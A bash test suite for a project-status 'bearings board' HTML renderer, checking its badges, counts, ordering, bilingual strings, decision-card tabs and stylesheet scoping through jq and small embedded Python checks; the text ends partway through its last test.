#!/usr/bin/env bash
# Behavior tests for the shipped bearings board renderer
# (.agents/skills/bearings/assets/board-template.html), exercised through a real
# `fm-bearings-board.sh build` and then executed under the minimal DOM shim in
# tests/assets/board-render-harness.mjs. The assertions are on what the page
# renders - row badges, the stat strip, the empty state - never on the
# template's source text.
set -u

# shellcheck source=tests/lib.sh
# shellcheck disable=SC1091
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

BOARD="$ROOT/bin/fm-bearings-board.sh"
HARNESS="$ROOT/tests/assets/board-render-harness.mjs"
TMP_ROOT=$(fm_test_tmproot fm-bearings-board-render)

command -v jq >/dev/null 2>&1 || { echo "skip: jq not found"; exit 0; }
command -v node >/dev/null 2>&1 || { echo "skip: node not found"; exit 0; }

make_home() {  # <name>
  local home="$TMP_ROOT/$1" fakebin
  # A build starts a listener for the board it publishes. Registered with
  # tests/lib.sh, not with a shell array: make_home runs inside a command
  # substitution, where an array append never reaches the caller.
  fm_test_track_procevent_home "$home" "$home/procevent-claims"
  mkdir -p "$home/state" "$home/data"
  fakebin=$(fm_fakebin "$home")
  # The build proves the board session is live before it arms anything, so the
  # stub reports the opened shape the real lavish-axi emits. This suite is about
  # what the template renders, not about session liveness, which
  # tests/fm-bearings-board.test.sh owns.
  cat > "$fakebin/lavish-axi" <<'SH'
#!/usr/bin/env bash
case "${1-}" in
  --version) printf '0.1.61\n' ;;
  '')
    printf 'sessions[1]{file,status,url,pending_prompts}:\n'
    [ ! -s "$FM_HOME/lavish-open" ] \
      || printf '  %s,open,"http://127.0.0.1/session/render",0\n' "$(cat "$FM_HOME/lavish-open")"
    ;;
  poll)
    # Bounded, so a listener that escapes its test stops on its own.
    while [ "$SECONDS" -lt "${FM_TEST_STUB_MAX_BLOCK_SECONDS:-120}" ]; do sleep 1; done
    exit 75
    ;;
  *)
    real=$(cd "$(dirname "$1")" && pwd -P)/$(basename "$1")
    printf '%s\n' "$real" > "$FM_HOME/lavish-open"
    printf 'session:\n  status: opened\n'
    ;;
esac
exit 0
SH
  chmod +x "$fakebin/lavish-axi"
  printf '%s\n' "$home"
}

# Build the board from <underway-json> plus <charted-json> and return what the
# renderer produced.
render_board() {  # <home> <underway-json> <charted-json> [charted_more] [charted_warning_more]
  local home=$1 underway=$2 charted=$3 more=${4:-0} warning_more=${5:-0} data="$1/payload.json"
  jq -n --argjson underway "$underway" --argjson charted "$charted" \
    --argjson more "$more" --argjson warning_more "$warning_more" '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-08-26T00:00Z",
    prs_live:false, captains_call:[], underway:$underway, landed:[],
    charted:$charted, charted_more:$more, charted_warning_more:$warning_more}' > "$data"
  PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$data" >/dev/null || fail "the board did not build"
  node "$HARNESS" "$home/.lavish/bearings-board.html" \
    || fail "the built board could not be rendered"
}

# Build the board from <charted-json> alone and return what the renderer produced.
render() {  # <home> <charted-json> [charted_more] [charted_warning_more]
  render_board "$1" '[]' "$2" "${3:-0}" "${4:-0}"
}

charted_next_count() {  # <render-json>
  printf '%s' "$1" | jq -r '.stats[] | select(.label == "charted next") | .n'
}

# Build the board from a complete payload document and return what the
# renderer produced.
render_payload() {  # <home> <payload-json>
  local home=$1 data="$1/payload.json"
  printf '%s\n' "$2" > "$data"
  PATH="$home/fakebin:$PATH" FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
    FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
    "$BOARD" build "$data" >/dev/null || fail "the board did not build"
  node "$HARNESS" "$home/.lavish/bearings-board.html" \
    || fail "the built board could not be rendered"
}

five_question_payload() {  # <lang>
  jq -n --arg lang "$1" '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-09-18T00:00Z",
    prs_live:false, lang:$lang, underway:[], landed:[],
    charted:[{id:"q1", repo:"sample", title:{en:"Queued work", hant:"排隊中的工作"},
              reason:{en:"waits on the cutover", hant:"等切換完成"}, dispatchable:true}],
    captains_call:[{
      key:"sample-admission", type:"decision", repo:"sample",
      title:{en:"Perishable-first admission", hant:"易腐品優先入場"},
      decide:{en:"Adopt it?", hant:"要採用嗎？"},
      about:{en:"Lots spoil while waiting", hant:"批次在等待時報廢"},
      if_nothing:{en:"Arrival order keeps spoiling lots", hant:"照到達順序會繼續報廢"},
      reversible:"partly", risk:"medium",
      recommend_value:"yes",
      recommend_why:{en:"40% fewer spoiled lots in the trial", hant:"試行時報廢少 40%"},
      options:[
        {value:"yes", label:{en:"Adopt", hant:"採用"}, consequence:{en:"reorders the queue", hant:"重排佇列"}},
        {value:"no", label:{en:"Keep current", hant:"維持現狀"}}],
      evidence:[{label:{en:"scout report", hant:"偵察報告"}, url:"https://example.test/report"}],
      packet_url:"https://example.test/packet.html"
    }]}'
}

test_a_decision_card_answers_the_five_questions_in_english_by_default() {
  local home out
  home=$(make_home five-en)
  out=$(render_payload "$home" "$(five_question_payload en)")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its fail-closed error instead of the card: $out"
  printf '%s' "$out" | jq -e '
    .headings == ["Captain'"'"'s Call", "Charted Next", "Underway", "Recently Landed"]
      and (.cards | length) == 1
      and (.cards[0]
        | .title == "Perishable-first admission"
          and (.badges | index("decision") != null)
          and (.badges | index("risk medium") != null)
          and (.badges | index("partly reversible") != null)
          and ([.ctx[] | .k] == ["decide", "about", "if nothing", "why"])
          and (.ctx[2].v == "Arrival order keeps spoiling lots")
          and (.options[0] | .label == "Adopt" and .consequence == "reorders the queue" and .rec == true)
          and (.options[1] | .label == "Keep current" and .rec == false)
          and ([.options[] | .label] | index("Reconcile") != null)
          and (.chips == ["open the packet", "scout report"]))
      and (.charted[0] | .title == "Queued work" and (.sub | test("waits on the cutover")))
  ' >/dev/null || fail "the five-question card did not render in English: $out"
  pass "a decision card answers the five questions in English by default"
}

test_the_payload_language_switches_every_visible_string() {
  local home out
  home=$(make_home five-hant)
  out=$(render_payload "$home" "$(five_question_payload hant)")
  printf '%s' "$out" | jq -e '
    .headings == ["船長裁決", "排定的下一步", "進行中", "最近完成"]
      and ([.stats[] | .label] == ["等你決定", "進行中", "最近完成", "排定的下一步"])
      and (.cards[0]
        | .title == "易腐品優先入場"
          and (.badges | index("風險 中") != null)
          and (.badges | index("部分可回頭") != null)
          and ([.ctx[] | .k] == ["決定什麼", "背景", "什麼都不做", "為什麼"])
          and (.options[0] | .label == "採用" and .consequence == "重排佇列")
          and ([.options[] | .label] | index("重新核對") != null)
          and (.chips == ["打開 packet", "偵察報告"]))
      and (.charted[0] | .title == "排隊中的工作" and (.sub | test("等切換完成"))
        and ([.badges[] | .text] == ["等待中"]))
      and ([.charted[] | .title] | map(test("[A-Za-z]")) | any | not)
  ' >/dev/null || fail "switching the payload language left English behind: $out"
  pass "the payload language switches headings, stats, card copy, badges, and injected options"
}

test_a_warning_row_reads_as_a_repair_not_as_queued_work() {
  local home out
  home=$(make_home warning-badge)
  out=$(render "$home" '[
    {"id":"real-queued","repo":"sample","title":"Queued work","reason":"queued behind the cutover","dispatchable":true},
    {"id":"main-inventory","repo":"sample","title":"Main inventory integrity","reason":"main inventory","dispatchable":false,"kind":"warning"}
  ]')
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its fail-closed error instead of the fleet: $out"
  printf '%s' "$out" | jq -e '
    (.charted | length) == 2
      and (.charted[0] | .title == "Queued work"
        and [.badges[] | .text] == ["waiting"] and .pickable == true)
      and (.charted[1] | .title == "Main inventory integrity"
        and [.badges[] | .text] == ["needs repair"]
        and [.badges[] | .tone] == ["danger"]
        and .pickable == false)
  ' >/dev/null || fail "a warning row did not read differently from queued work: $out"
  pass "a warning row badges needs repair while queued work keeps waiting"
}

test_warnings_are_excluded_from_the_charted_next_count() {
  local home out
  home=$(make_home warning-count)
  out=$(render "$home" '[
    {"id":"queued-one","repo":"sample","title":"One","reason":"gated","dispatchable":true},
    {"id":"warn-one","repo":"sample","title":"Home unreadable","reason":"current home state unavailable","dispatchable":false,"kind":"warning"},
    {"id":"warn-two","repo":"sample","title":"Inventory mismatch","reason":"main inventory","dispatchable":false,"kind":"warning"}
  ]')
  [ "$(charted_next_count "$out")" = 1 ] \
    || fail "the charted next tally counted alarms as queued work: $out"
  printf '%s' "$out" | jq -e '(.charted | length) == 3' >/dev/null \
    || fail "excluding warnings from the count also dropped their rows: $out"
  pass "the charted next count counts queued work only, and still renders warnings"
}

test_a_board_of_only_warnings_still_reports_nothing_queued() {
  local home out
  home=$(make_home warning-only)
  out=$(render "$home" '[
    {"id":"warn-only","repo":"sample","title":"Home unreadable","reason":"current home state unavailable","dispatchable":false,"kind":"warning"}
  ]')
  [ "$(charted_next_count "$out")" = 0 ] \
    || fail "a warning-only board claimed queued work: $out"
  printf '%s' "$out" | jq -e '
    (.empty | length) == 1 and (.empty[0] | test("Nothing is queued"))
      and (.charted | length) == 1
  ' >/dev/null || fail "a warning-only board hid the warning or the empty state: $out"
  pass "a warning-only board reports nothing queued and still shows the warning"
}

test_omitted_warnings_never_count_as_more_queued() {
  local home out
  home=$(make_home warning-more)
  out=$(render "$home" '[
    {"id":"warn-visible","repo":"sample","title":"Home unreadable","reason":"current home state unavailable","dispatchable":false,"kind":"warning"}
  ]' 0 1)
  [ "$(charted_next_count "$out")" = 0 ] \
    || fail "an omitted warning was counted as queued work: $out"
  printf '%s' "$out" | jq -e '
    (.empty | length) == 1 and (.empty[0] | test("Nothing is queued"))
      and (.more == ["+1 more repair warning - ask firstmate for the full chart"])
      and ([.more[] | select(test("more queued"))] | length) == 0
  ' >/dev/null || fail "an omitted warning was labeled as more queued: $out"
  pass "omitted warnings remain separate from omitted queued work"
}

test_an_omitted_kind_keeps_the_existing_queued_rendering() {
  local home out
  home=$(make_home default-kind)
  out=$(render "$home" '[
    {"id":"with-reason","repo":"sample","title":"With reason","reason":"blocked on prep","dispatchable":true},
    {"id":"no-reason","repo":"sample","title":"No reason","reason":"","dispatchable":true}
  ]' 2)
  [ "$(charted_next_count "$out")" = 4 ] \
    || fail "an omitted kind changed the charted next tally: $out"
  printf '%s' "$out" | jq -e '
    ([.charted[0].badges[] | .text] == ["waiting"])
      and (.charted[1].badges == [])
  ' >/dev/null || fail "an omitted kind changed the existing queued badges: $out"
  pass "an omitted kind renders exactly as queued work always did"
}

test_an_underway_row_leads_with_the_task_name_and_keeps_its_run_status() {
  local home out
  home=$(make_home underway-name)
  out=$(render_board "$home" '[
    {"id":"fm-board-name-r1","repo":"firstmate","name":"Show task names on the board",
     "state":"working","kind":"ship","doing":"no-mistakes: review round 2"}
  ]' '[]')
  printf '%s' "$out" | jq -e '
    (.underway | length) == 1
      and (.underway[0]
        | .title == "Show task names on the board"
          and (.sub | test("no-mistakes: review round 2"))
          and (.sub | test("ship")) and (.sub | test("firstmate"))
          and [.badges[] | .text] == ["working"])
  ' >/dev/null || fail "an underway row did not lead with the task name: $out"
  pass "an underway row leads with the task name and still reports its run status"
}

test_an_underway_identifier_label_is_not_replaced_by_run_status() {
  local home out
  home=$(make_home underway-identifier)
  out=$(render_board "$home" '[
    {"id":"mate/child-1","repo":null,"name":"mate/child-1",
     "state":"working","kind":"secondmate","doing":"fixing the failing check"}
  ]' '[]')
  printf '%s' "$out" | jq -e '
    (.underway | length) == 1
      and (.underway[0]
        | .title == "mate/child-1"
          and (.sub | startswith("fixing the failing check · "))
          and (.title != "fixing the failing check"))
  ' >/dev/null || fail "an identifier-labelled underway row rendered as status-only: $out"
  pass "an underway identifier label is not replaced by run status"
}

test_charted_next_reads_newest_filed_first() {
  local home out
  home=$(make_home charted-order)
  out=$(render_board "$home" '[]' '[
    {"id":"oldest","repo":"sample","title":"Filed in June","reason":"queued","dispatchable":true,"filed":"2026-06-01"},
    {"id":"newest","repo":"sample","title":"Filed in August","reason":"queued","dispatchable":true,"filed":"2026-08-14T09:30:00Z"},
    {"id":"middle","repo":"sample","title":"Filed in July","reason":"queued","dispatchable":true,"filed":"2026-07-22"}
  ]')
  printf '%s' "$out" | jq -e '
    [.charted[] | .title] == ["Filed in August", "Filed in July", "Filed in June"]
  ' >/dev/null || fail "charted next was not ordered newest filed first: $out"
  pass "charted next renders the most recently filed work first"
}

test_charted_rows_without_a_filed_date_follow_the_dated_rows_in_payload_order() {
  local home out
  home=$(make_home charted-undated)
  out=$(render_board "$home" '[]' '[
    {"id":"undated-first","repo":"sample","title":"Undated one","reason":"queued","dispatchable":true},
    {"id":"dated","repo":"sample","title":"Dated","reason":"queued","dispatchable":true,"filed":"2026-07-22"},
    {"id":"undated-second","repo":"sample","title":"Undated two","reason":"queued","dispatchable":true,"filed":null}
  ]')
  printf '%s' "$out" | jq -e '
    [.charted[] | .title] == ["Dated", "Undated one", "Undated two"]
  ' >/dev/null || fail "undated charted rows did not keep a stable trailing order: $out"
  pass "charted rows with no filed date follow the dated rows in payload order"
}

# ---- the packet, opened inside the card -------------------------------------
# The payload carries what bin/fm-packet.sh card reads out of a packet, so these
# assert what the template does with it, not how the packet is read.

packet_figure() {  # <slug> <node...> -> one contract-shaped drawing
  local slug=$1; shift
  local rects='' n
  for n in "$@"; do
    rects="$rects<rect data-node=\"$n\" x=\"1\" y=\"1\" width=\"9\" height=\"9\" fill=\"var(--card)\" stroke=\"var(--rule)\"/>"
  done
  jq -n --arg slug "$slug" --arg rects "$rects" --argjson nodes "$(printf '%s\n' "$@" | jq -R . | jq -s .)" '{
    slug: $slug, heading: ("Figure " + $slug), caption: ("what " + $slug + " proves"),
    svg: ("<svg viewBox=\"0 0 20 20\">" + $rects
      + "<text data-en=\"one path\" data-hant=\"一條路\" data-hans=\"一条路\">one path</text></svg>"),
    nodes: $nodes, edges: []}'
}

# A drawing that names the option it illustrates. The packet declares this;
# the board never infers it from the identities a drawing happens to carry.
packet_option_figure() {  # <slug> <option> <node...>
  local slug=$1 option=$2; shift 2
  packet_figure "$slug" "$@" | jq --arg o "$option" '. + {option: $o}'
}

# The same payload, with the recommended option carrying what the approved panel
# shows beyond a drawing: what it adds, removes and leaves alone, the files it
# touches, and what it buys.
packet_payload_full_option() {  # <lang> <figures-json>
  packet_payload "$1" "$2" | jq '
    .captains_call[0].options[0] += {
      buys: {en:"One behaviour to reason about.", hant:"只剩一種行為要想。"},
      files: ["bin/fm-contributions.sh", "tests/fm-contributions.test.sh"],
      changes: {
        added: [{en:"a merged-record rule", hant:"一條合併記錄規則"}],
        removed: [{en:"the stdout probe", hant:"stdout 判斷"}],
        unchanged: [{en:"the answer channel", hant:"回answer 通道"}]
      }
    }'
}

packet_payload() {  # <lang> <figures-json>
  jq -n --arg lang "$1" --argjson figures "$2" '{
    schema:"fm-bearings-board.v1", home:"render-home", generated:"2026-09-19T00:00Z",
    prs_live:false, lang:$lang, underway:[], landed:[], charted:[],
    captains_call:[{
      key:"stream-choice", type:"decision", repo:"firstmate",
      title:{en:"Where should the message go?", hant:"訊息該送到哪裡？"},
      decide:{en:"One stream or both?", hant:"一條還是兩條？"},
      if_nothing:{en:"The run stays parked.", hant:"流程停在原地。"},
      reversible:"yes", risk:"low", recommend_value:"quiet",
      recommend_why:{en:"One behaviour instead of two.", hant:"行為只剩一種。"},
      options:[
        {value:"quiet", label:{en:"Error stream only", hant:"只走錯誤輸出"},
         consequence:{en:"Two lines of code leave.", hant:"少兩段程式。"}},
        {value:"loud", label:{en:"Both streams", hant:"兩個都留"},
         consequence:{en:"The probe stays load-bearing.", hant:"那段判斷變成關鍵零件。"}}],
      allow_freeform:true,
      packet_url:"https://example.test/packet.html",
      packet:{
        figures:$figures,
        sections:[
          {heading:{en:"What only this session knows", hant:"只有這個 session 知道的事",
                    hans:"只有这个 session 知道的事"},
           items:[{text:{en:"the probe never ran on Linux", hant:"那段判斷沒在 Linux 上跑過",
                         hans:"那段判断没在 Linux 上跑过"}},
                  {links:[{label:{en:"PR #10", hant:"PR #10", hans:"PR #10"},
                           url:"https://example.test/pr/10"}]}]},
          {heading:{en:"How to pull more", hant:"怎麼再往下挖", hans:"怎么再往下挖"},
           items:[{text:"gh pr diff 10", code:true}]}]}
    }]}'
}

# A drawing that declares an id and points at it - a marker, a gradient, a
# clip, a <use> - is unique only within its own packet; the figure contract
# says so and owns that rule. This board puts many packets in ONE document, so
# two packets that both called a slug `cmp` would collide and the second card
# would draw with the first card's marker. The board namespaces what it inlines.
drawing_with_marker() {  # <slug> <node...> -> a drawing that references its own id
  local slug=$1; shift
  local rects='' n
  for n in "$@"; do
    rects="$rects<rect data-node=\"$n\" x=\"1\" y=\"1\" width=\"9\" height=\"9\" fill=\"var(--card)\" stroke=\"var(--rule)\"/>"
  done
  jq -n --arg slug "$slug" --arg rects "$rects" \
    --argjson nodes "$(printf '%s\n' "$@" | jq -R . | jq -s .)" '{
    slug: $slug, heading: ("Figure " + $slug), caption: ("what " + $slug + " proves"),
    svg: ("<svg viewBox=\"0 0 20 20\" role=\"img\" aria-labelledby=\"" + $slug + "-title\">"
      + "<title id=\"" + $slug + "-title\">what " + $slug + " proves</title>"
      + "<defs><marker id=\"" + $slug + "-arrow\">"
      + "<path d=\"M0 0 L8 4 L0 8 z\" fill=\"var(--muted)\"/></marker></defs>"
      + $rects
      + "<path data-edge=\"a-b\" d=\"M1 1 L9 9\" stroke=\"var(--muted)\" fill=\"none\" "
      + "marker-end=\"url(#" + $slug + "-arrow)\"/>"
      + "<text data-en=\"one path\" data-hant=\"一條路\" data-hans=\"一条路\">one path</text></svg>"),
    nodes: $nodes, edges: []}'
}

# The board owns the drawing's BOX and nothing inside it: the figure contract
# puts content in there the board did not write - diagram-design nests icon
# <svg> elements, and the drawing carries its own text, shapes and markers.
# A board rule written for "the drawing" whose selector reaches past it gives
# a 6x6 icon the outer drawing's width and height, and nothing refuses that:
# verify passes, svg-check passes, the card ships, and the captain just sees a
# broken picture.
#
# The render harness has no CSS at all - no getComputedStyle, no stylesheet,
# and innerHTML is a plain string it never parses - so the geometry itself
# cannot be observed here. What this proves instead is the half each side can:
# that the nested icon reaches the page with its own geometry intact, and that
# the shipped stylesheet carries no rule that would then take it away.
test_the_board_styles_a_drawings_box_and_never_its_insides() {
  local home out board nested
  home=$(make_home fig-scope)
  # the same shape as the nested-icon drawing tests/fm-packet.test.sh drives
  # through verify and the page: a 6x6 icon inside a 40x20 drawing
  nested=$(jq -n '{
    slug: "cmp", heading: "Figure cmp", caption: "what cmp proves",
    svg: ("<svg viewBox=\"0 0 40 20\">"
      + "<rect data-node=\"quiet\" x=\"1\" y=\"1\" width=\"9\" height=\"9\" fill=\"var(--card)\"/>"
      + "<svg x=\"12\" y=\"1\" width=\"6\" height=\"6\"><path d=\"M0 0 L6 6\" stroke=\"var(--muted)\"/></svg>"
      + "<rect data-node=\"loud\" x=\"20\" y=\"1\" width=\"9\" height=\"9\" fill=\"var(--card)\"/>"
      + "<text data-en=\"one path\" data-hant=\"一條路\" data-hans=\"一条路\">one path</text></svg>"),
    nodes: ["loud", "quiet"], edges: []}')
  out=$(render_payload "$home" "$(packet_payload en "[$nested]")")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its fail-closed error instead of the card: $out"
  # the icon reaches the page as its own element, with the geometry the
  # contract gave it - the board neither strips nor rewrites what it does not own
  printf '%s' "$out" | jq -e '
    (.cards[0].panels[0].figures[0]) as $svg
    | ($svg | test("<svg x=\"12\" y=\"1\" width=\"6\" height=\"6\">"))
      and ($svg | test("data-node=\"loud\""))
  ' >/dev/null || fail "the nested icon did not reach the board intact: $out"

  # and no rule in the stylesheet the board actually shipped reaches into it
  board="$home/.lavish/bearings-board.html"
  if ! python3 - "$board" <<'SCOPE'
import pathlib, re, sys
html = pathlib.Path(sys.argv[1]).read_text(encoding="utf-8")
css = re.sub(r"/\*.*?\*/", "", html.split("<style>", 1)[1].split("</style>", 1)[0], flags=re.S)
# the vocabulary a drawing is made of; bin/fm-packet-svg-lib.py is what enforces
# that a drawing carries nothing else, so these are the names that can appear
# inside one
DRAWING = {"svg", "g", "defs", "symbol", "use", "a", "title", "desc", "path", "rect",
           "circle", "ellipse", "line", "polyline", "polygon", "text", "marker",
           "clippath", "mask", "lineargradient", "radialgradient", "stop", "animate",
           "set", "animatetransform", "animatemotion", "mpath"}
reaches, unscoped = [], []
for rule in re.finditer(r"([^{}]+)\{[^{}]*\}", css):
    for sel in rule.group(1).split(","):
        sel = " ".join(sel.split())
        if not sel or sel.startswith("@"):
            continue
        # what the rule EXCLUDES does not reach anything
        positive = re.sub(r":not\([^)]*\)", "", sel).strip()
        if not positive:
            continue
        if re.match(r"^\.bb-fig\s+(?![>+~])\S", positive):
            reaches.append(sel)
        key = re.sub(r"[:\[].*$", "", positive.split()[-1].split(">")[-1].strip())
        if key.lower() in DRAWING and "." not in positive and "#" not in positive:
            if ".bb-fig" not in sel:
                unscoped.append(sel)
if reaches:
    print("rules reaching inside a drawing: %s" % ", ".join(reaches)); sys.exit(1)
if unscoped:
    print("rules styling a drawing element document-wide: %s" % ", ".join(unscoped)); sys.exit(1)
SCOPE
  then
    fail "the board stylesheet reaches inside a drawing"
  fi
  pass "the board styles a drawing's box and never its insides"
}

# Every link the board builds carries a class (link() gives it one), and that
# class owns its colour and its decoration. A board-wide `a` rule with an
# exception carved out for drawings is what this refuses: :not() carries its
# argument's specificity, so such a rule outranks the very class rules it was
# written around, and the chips lose the one affordance that says they are
# links. The harness cannot see CSS at all - no getComputedStyle, no
# stylesheet, innerHTML is a string it never parses - so what is asserted here
# is the cascade the shipped stylesheet actually resolves to, computed from it.
test_a_board_links_own_class_decides_how_it_reads() {
  local home board
  home=$(make_home link-cascade)
  render_payload "$home" "$(packet_payload en "[$(packet_figure cmp quiet loud)]")" >/dev/null
  board="$home/.lavish/bearings-board.html"
  if ! python3 - "$board" <<'CASCADE'
import pathlib, re, sys
html = pathlib.Path(sys.argv[1]).read_text(encoding="utf-8")
css = re.sub(r"/\*.*?\*/", "", html.split("<style>", 1)[1].split("</style>", 1)[0], flags=re.S)

def spec(sel):
    base = re.sub(r":(not|where|is)\([^)]*\)", "", sel)
    a = len(re.findall(r"#[\w-]+", base))
    b = len(re.findall(r"\.[\w-]+", base)) + len(re.findall(r"(?<!:):(?!:)[a-z-]+", base))
    c = len(re.findall(r"(?:^|[\s>+~])([a-z][\w-]*)", base))
    inner = (0, 0, 0)
    for arg in re.findall(r":not\(([^)]*)\)", sel):   # :not() carries its argument
        inner = max(inner, spec(arg))
    return (a + inner[0], b + inner[1], c + inner[2])

rules = []
for order, m in enumerate(re.finditer(r"([^{}]+)\{([^{}]*)\}", css)):
    decls = {}
    for chunk in m.group(2).split(";"):
        if ":" in chunk:
            k, v = chunk.split(":", 1)
            decls[k.strip()] = v.strip()
    for sel in m.group(1).split(","):
        sel = " ".join(sel.split())
        if sel and not sel.startswith("@"):
            rules.append((order, sel, decls))

# every anchor the board builds, by the classes link() gives it and where it sits
LINKS = {
    "pr link on a decision card": (["bb-decision__link"], []),
    "evidence chip": (["bb-chip"], []),
    "packet chip": (["bb-chip", "bb-chip--packet"], []),
    "link inside the packet block": (["bb-packet__link"], ["bb-packet__body"]),
    "PR link on an underway row": (["bb-row__pr"], []),
}

def matches(sel, classes, containers):
    # a functional pseudo-class holds a selector of its own; it decides nothing
    # about what this rule MATCHES, only what it excludes and how specific it is
    parts = re.sub(r":(not|where|is)\([^)]*\)", "", sel).split()
    if not parts:
        return False
    key = parts[-1]
    if key.startswith("."):
        if key.lstrip(".").split(":")[0] not in classes:
            return False
    elif re.match(r"^[a-z]", key):
        if key.split(":")[0] != "a":
            return False
    else:
        return False
    for anc in parts[:-1]:
        if anc in (">", "+", "~"):
            continue
        if anc.lstrip(".").split(":")[0] not in containers + classes:
            return False
    return True

bad = []
for name, (classes, containers) in LINKS.items():
    for prop in ("color", "text-decoration"):
        cands = sorted((spec(s), o, s) for o, s, d in rules
                       if prop in d and ":hover" not in s and matches(s, classes, containers))
        if not cands:
            bad.append("%s: nothing sets %s, so the browser default decides" % (name, prop))
            continue
        winner = cands[-1][2]
        if "." not in re.sub(r":(not|where|is)\([^)]*\)", "", winner):
            bad.append("%s: %s is decided by %s, not by the class the board gave it"
                       % (name, prop, winner))
if bad:
    print("\n".join(bad)); sys.exit(1)
CASCADE
  then
    fail "a board link is not styled by its own class"
  fi
  pass "a board link's own class decides how it reads"
}

test_two_cards_drawing_with_the_same_slug_do_not_share_ids() {
  local home out payload figure
  home=$(make_home packet-id-namespace)
  # Both packets were written independently and both called their comparison
  # `cmp`, which the figure contract allows: it guarantees uniqueness inside one
  # packet, not across a board.
  figure=$(drawing_with_marker cmp quiet loud)
  payload=$(packet_payload en "[$figure]" | jq --argjson fig "$figure" '
    .captains_call += [(.captains_call[0]
      | .key = "second-choice"
      | .title = {en: "A second decision", hant: "第二個決定"}
      | .packet.figures = [$fig])]')
  out=$(render_payload "$home" "$payload")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its fail-closed error instead of the cards: $out"
  printf '%s' "$out" | jq -e '
    (.cards | length) == 2
    and ((.cards | map(.panels[0].figures[0])) as $svgs
      # what each card POINTS AT, and what each card DECLARES
      | ($svgs | map(capture("url\\(#(?<r>[^)]+)\\)").r)) as $refs
      | ($svgs | map(capture("id=\"(?<i>[^\"]*-arrow)\"").i)) as $ids
      # each card resolves inside its own drawing
      | ($refs == $ids)
      # and the two cards are not in one namespace
      and (($refs | unique | length) == 2)
      # the slug the packet actually wrote is still what the figure is tagged
      and ($refs | all(. | test("cmp-arrow$")))
      # and the accessible name the drawing declares still points at its own
      # <title>, which an IDREF list names with no "#" to give it away
      and ($svgs | all(. as $s
        | ($s | capture("aria-labelledby=\"(?<a>[^\"]+)\"").a) as $named
        | $s | test("id=\"" + $named + "\""))))
  ' >/dev/null || fail "two cards sharing a slug shared one id namespace: $out"
  pass "two cards drawing with the same slug each resolve their own ids"
}

test_a_packet_with_figures_opens_its_tabs_inside_the_card() {
  local home out figures
  home=$(make_home packet-tabs)
  figures=$(jq -n --argjson c "$(packet_figure cmp quiet loud)" \
                  --argjson q "$(packet_option_figure quiet-only quiet quiet)" '[$c, $q]')
  out=$(render_payload "$home" "$(packet_payload en "$figures")")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "the board rendered its fail-closed error instead of the card: $out"
  printf '%s' "$out" | jq -e '
    (.cards | length) == 1
      and (.cards[0]
        # one tab for the difference, then one per option, reconcile included
        | ([.tabs[] | .label] == ["Difference", "Error stream only", "Both streams", "Reconcile"])
          and ([.tabs[] | .selected] == [true, false, false, false])
          and ([.panels[] | .hidden] == [false, true, true, true])
          # the drawing that names every option leads, in its own panel
          and ((.panels[0].figures | length) == 1)
          and (.panels[0].figures[0] | test("data-node=\"quiet\"") and test("data-node=\"loud\""))
          # an option that declares its own drawing shows it
          and ((.panels[1].figures | length) == 1)
          and (.panels[1].figures[0] | test("data-node=\"quiet\"") and (test("data-node=\"loud\"") | not))
          # one that declares none simply has none: the comparison tab already
          # carries the drawing, so an empty-state scold there would be the
          # board inventing a defect out of a packet that met its contract
          and (.panels[2].figures == [])
          and (.panels[2].notes == [])
          # each option answers from inside its own tab, and what its button
          # sends down the answer channel is the value that option carries
          and (.panels[1] | .label == "Error stream only" and .cost == "Two lines of code leave."
            and ([.buttons[] | .queues.selection] == ["quiet"])
            and (.buttons[0].queues | .schema == "fm-bearings-answer.v1" and .question == "stream-choice")
            and (.buttons[0].text | test("Choose Error stream only")))
          and (.panels[2] | .label == "Both streams" and ([.buttons[] | .queues.selection] == ["loud"]))
          and (.panels[3] | [.buttons[] | .queues.selection] == ["reconcile"]))
  ' >/dev/null || fail "the packet did not open as tabs inside the card: $out"
  pass "a packet with figures opens one tab per option, each with its own drawing and button"
}

test_a_packet_without_figures_still_renders_its_card() {
  local home out
  home=$(make_home packet-no-figures)
  out=$(render_payload "$home" "$(packet_payload en '[]')")
  printf '%s' "$out" | jq -e '.error == ""' >/dev/null \
    || fail "a packet with no drawings refused to render: $out"
  printf '%s' "$out" | jq -e '
    (.cards[0]
      | ([.tabs[] | .label] == ["Difference", "Error stream only", "Both streams", "Reconcile"])
        and ([.panels[] | .figures] | flatten | length) == 0
        and ([.panels[] | .buttons[] | .queues.selection] == ["quiet", "loud", "reconcile"])
        and (.packet.items == [["the probe never ran on Linux", "PR #10"], ["gh pr diff 10"]]))
  ' >/dev/null || fail "a packet with no drawings lost its tabs or its body: $out"
  pass "a packet with no figures still renders its tabs, its answers and its body"
}

test_the_packet_body_stays_in_the_language_it_was_written_in() {
  local home out figures
  home=$(make_home packet-lang)
  figures=$(packet_figure cmp quiet loud)
  out=$(render_payload "$home" "$(packet_payload hant "[$figures]")")
  printf '%s' "$out" | jq -e '
    (.cards[0]
      # everything the packet carries in three languages follows the captain
      | ([.tabs[] | .label] == ["差在哪", "只走錯誤輸出", "兩個都留", "重新核對"])
        and (.panels[1] | .cost == "少兩段程式。" and (.buttons[0].text | test("選 只走錯誤輸出")))
        and (.panels[0].notes | map(test("[A-Za-z]")) | any | not)
        # the headings in that block are words this renderer owns, so they
        # follow him too - the prototype the captain approved carries all
        # three on every heading in that block
        and (.packet.headings == ["只有這個 session 知道的事", "怎麼再往下挖"])
        # the block is labelled with the language it is actually rendered in,
        # which is the one the captain chose
        and (.packet.lang == "zh-Hant")
        # and so do the lines the worker wrote: the packet carries all three,
        # so no part of the block stands still while the rest of it moves
